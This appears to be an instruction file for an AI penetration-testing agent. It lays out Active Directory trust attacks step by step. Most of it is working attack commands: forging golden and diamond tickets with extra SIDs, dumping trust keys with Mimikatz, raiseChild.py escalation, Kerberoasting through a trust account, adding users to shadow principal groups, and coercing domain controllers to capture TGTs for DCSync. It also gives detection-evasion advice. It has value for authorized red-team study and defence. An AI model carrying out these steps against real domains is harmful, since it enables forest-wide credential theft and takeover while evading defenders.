---
name: trust-attacks
description: >
  Enumerates Active Directory trust relationships and exploits them for
  cross-domain and cross-forest privilege escalation. Covers trust enumeration
  (nltest, PowerView, BloodHound), SID history injection (child domain to
  forest root via golden/diamond ticket with extra SIDs), inter-realm TGT
  forging using trust keys, TGT delegation coercion capture (Rubeus monitor +
  SpoolSample/DFSCoerce across forest trusts with ENABLE_TGT_DELEGATION),
  cross-forest trust abuse (SID filtering bypass, RBCD, Kerberoasting via
  trust account), and PAM trust exploitation (shadow principals in bastion
  forests).
keywords:
  - trust attacks
  - domain trust
  - forest trust
  - SID history
  - child to parent
  - cross-forest
  - inter-realm
  - trust key
  - extra SID
  - raiseChild
  - PAM trust
  - shadow principals
  - bastion forest
  - trust enumeration
  - SID filtering
  - forest root
  - TGT delegation
  - ENABLE_TGT_DELEGATION
  - CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
  - unconstrained delegation trust
  - coercion capture
  - SpoolSample
  - ticketConverter
tools:
  - Mimikatz
  - Rubeus
  - Impacket (ticketer.py
  - raiseChild.py
  - lookupsid.py
  - ticketConverter.py)
  - PowerView
  - bloodyAD
  - NetExec
  - SpoolSample / printerbug.py
  - DFSCoerce
  - PetitPotam
opsec: medium
---

# Trust Attacks

You are helping a penetration tester enumerate and exploit Active Directory
trust relationships for cross-domain and cross-forest privilege escalation.
All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[trust-attacks] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

**Access required**: Domain Admin in at least one domain (for trust key
extraction and krbtgt hash). Lower-privilege paths exist for trust account
authentication.

**Kerberos authentication setup** (for enumeration and tool execution):
```bash
# Obtain TGT
getTGT.py 'DOMAIN.LOCAL/username:password' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/username.ccache

# All Impacket commands: -k -no-pass
# NetExec: --use-kcache
# bloodyAD: -k
```

**Tools**: Mimikatz, Rubeus, Impacket (ticketer.py, raiseChild.py,
lookupsid.py, secretsdump.py, psexec.py), PowerView, bloodyAD, NetExec.

## Step 1: Enumerate Trust Relationships

### Trust Discovery

```bash
# Native Windows
nltest /trusted_domains

# PowerView — all trusts with properties
Get-DomainTrust
Get-DomainTrust -Domain parent.local

# AD Module — trust properties (critical for attack viability)
Get-ADTrust -Filter * -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive

# .NET — all trusts from current domain
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# NetExec module
nxc ldap DC_IP -u 'user' -p 'pass' --use-kcache -M enum_trusts

# Impacket — enumerate SIDs in target domain
lookupsid.py -k -no-pass DOMAIN/user@DC_IP
```

### Key Properties to Assess

| Property | Impact |
|----------|--------|
| `SIDFilteringQuarantined` | If `False`, SID history injection works across trust |
| `SelectiveAuthentication` | If `True`, only explicitly allowed users can authenticate |
| `ForestTransitive` | Indicates forest-level trust (broader scope) |
| `TrustDirection` | Inbound/Outbound/Bidirectional — determines attack direction |
| `TGTDelegation` | If `True`, unconstrained delegation possible across trust |

### Cross-Domain Group Membership

```bash
# Foreign group members (users from other domains in local groups)
Get-DomainForeignGroupMember
Get-DomainForeignGroupMember -Domain parent.local

# Foreign users with local admin
Get-NetLocalGroupMember -ComputerName dc.parent.local
```

### Trust Type Decision Tree

```
Trust Found
├── Parent-Child (in-forest) → SID filtering NOT enforced → Step 2 (SID History)
├── Forest Trust
│   ├── TGTDelegation = True + admin on trusted DC → Step 6 (TGT Delegation Coercion)
│   ├── SIDFilteringQuarantined = False → Step 2 (SID History cross-forest)
│   ├── SIDFilteringQuarantined = True → Step 3 (Trust Ticket) or Step 5 (enum only)
│   └── PAM trust attributes → Step 4 (Shadow Principals)
├── External Trust
│   ├── SIDFilteringQuarantined = False → Step 2 (SID History)
│   └── SIDFilteringQuarantined = True → Step 3 (Trust Ticket) + Step 5
└── One-Way Trust
    ├── Inbound (they trust us) → Step 3 (authenticate into their domain)
    └── Outbound (we trust them) → Step 5 (limited attack surface)
```

## Step 2: SID History Injection (Child -> Parent / Cross-Forest)

The primary trust escalation technique. Forge a ticket in the child domain
with the parent domain's Enterprise Admins SID (S-1-5-21-PARENT-519) in
the SID history field.

**Prerequisite**: krbtgt hash from child domain + parent domain SID.

### Obtain Domain SIDs

```bash
# Child domain SID
lookupsid.py -k -no-pass CHILD.LOCAL/user@child-dc 0

# Parent domain SID + Enterprise Admins
lookupsid.py -k -no-pass CHILD.LOCAL/user@parent-dc | grep "Enterprise Admins"
# Note the SID before -519 as the parent domain SID
```

### Golden Ticket with Extra SIDs (Mimikatz)

```powershell
# AES256 preferred — avoids RC4 detection
kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-CHILD_SID /aes256:<CHILD_KRBTGT_AES256> /sids:S-1-5-21-PARENT_SID-519 /startoffset:-10 /endin:600 /renewmax:10080 /ptt

# RC4 fallback
kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-CHILD_SID /rc4:<CHILD_KRBTGT_RC4> /sids:S-1-5-21-PARENT_SID-519 /ptt
```

Use `/startoffset`, `/endin`, `/renewmax` to match domain policy (avoid
default 10-year lifetime which is an obvious detection indicator).

### Diamond Ticket with Extra SIDs (Rubeus — Recommended for OPSEC)

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-PARENT_SID-519 /krbkey:<CHILD_KRBTGT_AES256> /nowrap /ldap
```

Diamond ticket modifies a legitimate TGT — generates matching 4768->4769
event pairs (golden ticket skips the 4768).

### Impacket ticketer.py (Linux)

```bash
# Generate ticket with extra SID
ticketer.py -nthash <CHILD_KRBTGT_NTLM> \
  -domain child.local \
  -domain-sid S-1-5-21-CHILD_SID \
  -extra-sid S-1-5-21-PARENT_SID-519 \
  Administrator

# Or with AES (preferred)
ticketer.py -aesKey <CHILD_KRBTGT_AES256> \
  -domain child.local \
  -domain-sid S-1-5-21-CHILD_SID \
  -extra-sid S-1-5-21-PARENT_SID-519 \
  Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass child.local/Administrator@parent-dc.parent.local
secretsdump.py -k -no-pass child.local/Administrator@parent-dc.parent.local
```

### Automated: raiseChild.py

```bash
# Full automation: extract krbtgt, get parent SID, forge ticket, authenticate
raiseChild.py -target-exec parent-dc.parent.local child.local/admin_user

# With Kerberos auth
raiseChild.py -k -no-pass -target-exec parent-dc.parent.local child.local/admin_user
```

Automatically: gets Enterprise Admins SID from parent, retrieves child
krbtgt, creates golden ticket with extra SID, authenticates to parent DC,
extracts parent admin credentials.

### PAC Validation Considerations (2025+)

Windows Server 2025 DCs with PAC signature validation in enforcement mode
(CVE-2024-26248/29056) require valid cross-realm PAC signatures. Check
registry `PacSignatureValidationLevel`:
- **Compatibility mode** (default during rollout): forged PAC accepted
- **Enforcement mode** (2025+ default): requires trust key to sign PAC

If enforcement mode is active, use trust ticket approach (Step 3) instead.

## Step 3: Inter-Realm TGT Forging (Trust Ticket)

Forge an inter-realm TGT using the trust account key. Useful when:
- You have the trust key but not the krbtgt hash
- PAC enforcement blocks SID history injection
- Attacking external/forest trusts where SID filtering is enabled

### Extract Trust Key

```powershell
# Mimikatz — dump trust keys from DC
lsadump::trust /patch
# Look for: [In] DOMAIN$ -> NTLM: <RC4>, AES256: <AES>
# Look for: [Out] DOMAIN$ -> NTLM: <RC4>, AES256: <AES>

# Alternative: DCSync the trust account
lsadump::lsa /inject /name:TARGETDOMAIN$
```

```bash
# Impacket — DCSync trust account
secretsdump.py -k -no-pass DOMAIN/admin@dc | grep '\$'
```

### Forge Inter-Realm TGT

```powershell
# Mimikatz — inter-realm TGT (referral ticket)
kerberos::golden /domain:source.local /sid:S-1-5-21-SOURCE_SID /rc4:<TRUST_RC4> /user:Administrator /service:krbtgt /target:target.local /ticket:trust.kirbi

# Request service ticket in target domain
Rubeus.exe asktgs /ticket:trust.kirbi /service:CIFS/dc.target.local /dc:dc.target.local /ptt
```

### Trust Account Authentication

```powershell
# Authenticate as the trust account itself
Rubeus.exe asktgt /user:TARGETDOMAIN$ /domain:source.local /rc4:<TRUST_RC4> /dc:dc.source.local /ptt

# Now Kerberoast in target domain
Rubeus.exe kerberoast /domain:target.local
```

```bash
# From Linux
getTGT.py -hashes :<TRUST_NTLM> source.local/TARGETDOMAIN\$
export KRB5CCNAME=TARGETDOMAIN\$.ccache

# Kerberoast via trust account
GetUserSPNs.py -k -no-pass -target-domain target.local source.local/TARGETDOMAIN\$
```

## Step 4: PAM Trust Exploitation (Shadow Principals)

PAM (Privileged Access Management) trusts use shadow security principals in
a bastion forest to manage access to production forests. Compromising the
bastion forest gives instant access to all managed forests.

**Prerequisite**: Windows Server 2016 or later. Trust with
`ForestTransitive=True` and `SIDFilteringQuarantined=False`.

### Enumerate Shadow Principals

```powershell
# Find shadow principal configuration
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | Select Name,member,msDS-ShadowPrincipalSid

# Example output:
# Name: forest-ShadowEnterpriseAdmin
# member: CN=PAMAdmin,CN=Users,DC=bastion,DC=local
# msDS-ShadowPrincipalSid: S-1-5-21-MANAGED_SID-519
```

### Exploit: Add User to Shadow Principal Group

```powershell
# Windows — add compromised user to shadow principal
Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" -Add @{'member'="CN=compromised_user,CN=Users,DC=bastion,DC=local"}
```

```bash
# Linux — bloodyAD (Kerberos auth)
bloodyAD --host bastion-dc -d bastion.local -k add groupMember \
  'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local' \
  compromised_user
```

Result: compromised user now has Enterprise Admin rights in all managed
forests via the shadow principal SID mapping.

## Step 5: Cross-Forest Enumeration via Trust Account

When SID filtering is enabled and direct escalation is blocked, use the
trust account for reconnaissance in the target forest.

### Kerberoasting via Trust

```bash
# Authenticate as trust account
getTGT.py -hashes :<TRUST_NTLM> source.local/TARGETDOMAIN\$
export KRB5CCNAME=TARGETDOMAIN\$.ccache

# Kerberoast in target domain
GetUserSPNs.py -k -no-pass -target-domain target.local source.local/TARGETDOMAIN\$ -outputfile trust-kerberoast.txt
```

### Cross-Forest RBCD

When you control a machine account in the trusted forest and have write
access to a computer in the trusting forest:

```powershell
# 1. Set RBCD on target in trusting forest
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount OURHOST$

# 2. Request inter-realm TGT
Rubeus.exe asktgt /user:OURHOST$ /domain:our.local /rc4:<RC4> /ptt

# 3. S4U impersonation
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/victim-host.target.local /altservice:LDAP /ptt
```

### Enumerate Across Trust

```bash
# BloodHound collection across trust
bloodhound-python -u 'user' -p 'pass' -d target.local -ns TARGET_DC_IP -c All

# LDAP queries into target domain
nxc ldap TARGET_DC -u 'user' -p 'pass' -d target.local --users
nxc ldap TARGET_DC -u 'user' -p 'pass' -d target.local --groups
```

## Step 6: TGT Delegation Coercion Capture (Cross-Forest)

When a forest trust has `TGTDelegation = True` (the `CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`
flag), DCs in the trusting forest forward their full TGT when authenticating
cross-forest to DCs in the trusted forest. DCs have unconstrained delegation
by default — any DC in the trusted forest can harvest forwarded TGTs.

**Prerequisites**: Admin/SYSTEM on a DC in the **trusted** forest (the forest
that receives authentication). Forest trust with TGTDelegation enabled.

**See also**: kerberos-delegation Step 2 covers unconstrained delegation TGT
harvesting in same-domain context. This step applies the same technique
cross-forest via the trust's TGT delegation flag.

### 1. Monitor for Incoming TGTs (Trusted Forest DC)

```powershell
# Rubeus — monitor for TGTs arriving via unconstrained delegation
# Run on the DC in the trusted forest (where you have admin)
Rubeus.exe monitor /interval:5 /nowrap /filteruser:TRUSTING_DC$
```

### 2. Coerce the Trusting Forest DC

Trigger the trusting forest DC to authenticate to the trusted forest DC.
**Critical: use the HOSTNAME of the trusted DC, not its IP.** IP causes NTLM
fallback which does not trigger TGT forwarding. The hostname forces Kerberos
authentication, which triggers the TGT delegation.

```bash
# From any host with domain creds — coerce TRUSTING_DC → TRUSTED_DC
# Use HOSTNAME for listener (forces Kerberos, triggers TGT forwarding)
python3 printerbug.py DOMAIN/user@TRUSTING_DC TRUSTED_DC_HOSTNAME
python3 PetitPotam.py -u user -p 'password' -d DOMAIN TRUSTED_DC_HOSTNAME TRUSTING_DC
python3 dfscoerce.py -u user -d DOMAIN TRUSTED_DC_HOSTNAME TRUSTING_DC
```

### 3. Capture and Use Forwarded TGT

Rubeus captures the trusting DC's machine TGT (e.g., `DC01$`). Convert and
use for DCSync:

```bash
# Convert .kirbi (base64 from Rubeus) → .ccache
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# DCSync the trusting forest with the captured DC machine TGT
secretsdump.py -k -no-pass TRUSTING_DOMAIN/DC01\$@TRUSTING_DC_FQDN -just-dc
```

## Step 7: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### SID History Injection Fails

- **SID filtering enabled**: Check `Get-ADTrust -Properties SIDFilteringQuarantined`.
  If `True` on forest trust, SID history is stripped. Use trust ticket (Step 3)
  or Kerberoasting via trust account (Step 5) instead.
- **Selective Authentication**: Check `SelectiveAuthentication` property.
  If `True`, only explicitly allowed users can authenticate across the trust.
- **PAC validation enforcement**: Windows Server 2025+ DCs may enforce PAC
  signatures. Use diamond ticket or trust ticket approach.

### Trust Key Extraction Fails

- **lsadump::trust /patch fails**: Try `lsadump::lsa /inject /name:DOMAIN$`
  or DCSync the trust account: `secretsdump.py -k -no-pass domain/admin@dc`.
- **Trust key rotated**: Trust passwords rotate every 30 days. Extract the
  current key, not a cached one.

### Cross-Forest Access Denied

- **Clock skew** (`KRB_AP_ERR_SKEW`): **Clock Skew Interrupt** — stop
  immediately and return to the orchestrator. Do not retry or fall back to
  NTLM. Fix requires root: `sudo ntpdate TARGET_DC`
- **DNS resolution**: Target DC must be resolvable. Add `/etc/hosts` entries
  or configure DNS forwarding.
- **Service ticket refused**: Verify the service exists and the trust account
  has access. Try CIFS first (most permissive).

### raiseChild.py Errors

- **"Cannot find the domain"**: Ensure DNS resolution for both child and
  parent domain. Add `/etc/hosts` entries for both DCs.
- **"Access denied"**: Requires DA in the child domain. Verify with
  `nxc smb child-dc -k --use-kcache`.

### Diamond Ticket SID History

- **Rubeus diamond fails**: Ensure `/ldap` flag is included for PAC
  attribute resolution. Use `/tgtdeleg` for automatic TGT acquisition.
- **Missing /sids**: The `/sids` parameter is required for cross-domain
  escalation — without it, the ticket is valid only in the current domain.

## OPSEC Comparison

| Technique | OPSEC | Detection | Notes |
|-----------|-------|-----------|-------|
| Trust enumeration | Low | Read-only LDAP queries | Standard recon |
| Diamond ticket + extra SID | Medium | 4768+4769 pair (normal) | Best for stealth |
| Golden ticket + extra SID | Medium-High | 4769 without 4768 | Detectable pattern |
| Inter-realm TGT (trust key) | Medium | Service ticket requests from trust account | Unusual but not alarming |
| Trust account Kerberoasting | Low-Medium | 4769 events | Offline cracking |
| raiseChild.py | High | Full chain (DCSync + ticket + auth) | Automated = fast but loud |
| PAM shadow principal modification | Medium | 5136 (object modification) | Bastion forest only |
| Cross-forest RBCD | Medium | S4U2Proxy events (4769) | Requires write access |
| TGT delegation coercion | Medium | 4624 + coercion RPC (4769 cross-forest) | Requires admin on trusted DC |
